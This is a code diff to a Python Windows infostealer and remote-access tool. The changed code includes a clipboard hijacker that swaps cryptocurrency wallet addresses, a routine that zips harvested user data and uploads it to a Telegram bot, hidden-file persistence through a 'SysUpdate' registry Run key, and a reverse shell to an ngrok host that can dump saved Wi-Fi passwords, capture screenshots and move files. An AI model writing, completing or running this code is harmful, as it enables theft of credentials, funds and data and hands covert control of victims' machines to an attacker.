@@ -27,7 +27,6 @@ import cv2
 # import nss
 import threading
 import ctypes
-import sys
 
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
@@ -278,58 +277,35 @@ def clipper():
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
     except: pass
-    
-import datetime
-
 
 # === ZIP & TELEGRAM ===
 def send_zip_to_telegram():
+    zip_name = f"{getpass.getuser()}_exfil_data"
+    shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
     try:
-        zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        zip_path = shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
-
-        with open(zip_path, "rb") as f:
-            response = requests.post(
+        with open(f"{zip_name}.zip", "rb") as f:
+            requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                 data={"chat_id": CHAT_ID},
-                files={"document": (os.path.basename(zip_path), f)}
+                files={"document": (f"{zip_name}.zip", f)}
             )
-
-        os.remove(zip_path)
-        print("[+] Data sent to Telegram.")
+        os.remove(f"{zip_name}.zip")
     except Exception as e:
         print(f"[!] Telegram send failed: {e}")
-
 
 # === PERSISTENCE ===
 def persist():
     try:
-        current_path = os.path.abspath(sys.argv[0])  # Use sys.argv[0] to ensure correct .exe
-        dest_path = os.path.join(EXTRACT_FOLDER, "system_service.exe")
-
-        # Copy to hidden location if not already running from there
-        if current_path.lower() != dest_path.lower():
-            if not os.path.exists(dest_path):
-                shutil.copy2(current_path, dest_path)
-                subprocess.call(f'attrib +h "{dest_path}"', shell=True)
-
-            # Relaunch from hidden path
-            subprocess.Popen(f'"{dest_path}"', shell=True)
-            os._exit(0)  # Exit current instance
-
-        # Always re-add to registry on launch
-        reg_key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE
-        )
-        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
-        winreg.CloseKey(reg_key)
-
-    except Exception as e:
-        print(f"[!] Persistence error: {e}")
-
-
+        path = os.path.abspath(__file__)
+        dest_path = os.path.join(EXTRACT_FOLDER, os.path.basename(path))
+        if not os.path.exists(dest_path):
+            shutil.copy2(path, dest_path)
+            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
+        winreg.CloseKey(key)
+    except: pass
 
 def fake_input():
     for _ in range(3):
@@ -356,45 +332,39 @@ def reverse_shell():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)  # ← Timeout to prevent hanging on recv
             s.connect((NGROK_HOST, NGROK_PORT))
+            
 
             def send_data(data):
                 if not isinstance(data, bytes):
                     data = data.encode()
-                try:
-                    s.send(data + b"\n")
-                except:
-                    raise ConnectionError
+                s.send(data + b"\n")
 
             def get_system_info():
                 info = f"""
-OS         : {platform.system()} {platform.version()}
-Machine    : {platform.machine()}
-Processor  : {platform.processor()}
-Username   : {getpass.getuser()}
-Hostname   : {socket.gethostname()}
-IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
-RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
-"""
+    OS         : {platform.system()} {platform.version()}
+    Machine    : {platform.machine()}
+    Processor  : {platform.processor()}
+    Username   : {getpass.getuser()}
+    Hostname   : {socket.gethostname()}
+    IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
+    RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
+    """
                 return info
 
             def show_help():
                 return """Available Commands:
-    help                - Show this menu
-    info                - System info
-    wifi                - Dump saved Wi-Fi SSIDs + passwords
-    screenshot          - Capture screen & send
-    download <file>     - Download a file
-    upload <file>       - Upload a file
-    cd <dir>            - Change working directory
-    exit / quit         - Close shell"""
+        help                - Show this menu
+        info                - System info
+        wifi                - Dump saved Wi-Fi SSIDs + passwords
+        screenshot          - Capture screen & send
+        download <file>     - Download a file
+        upload <file>       - Upload a file
+        cd <dir>            - Change working directory
+        exit / quit         - Close shell"""
 
             while True:
-                try:
-                    cmd = s.recv(1024).decode("utf-8").strip()
-                except socket.timeout:
-                    continue  # Just try again
+                cmd = s.recv(1024).decode("utf-8").strip()
 
                 if not cmd:
                     continue
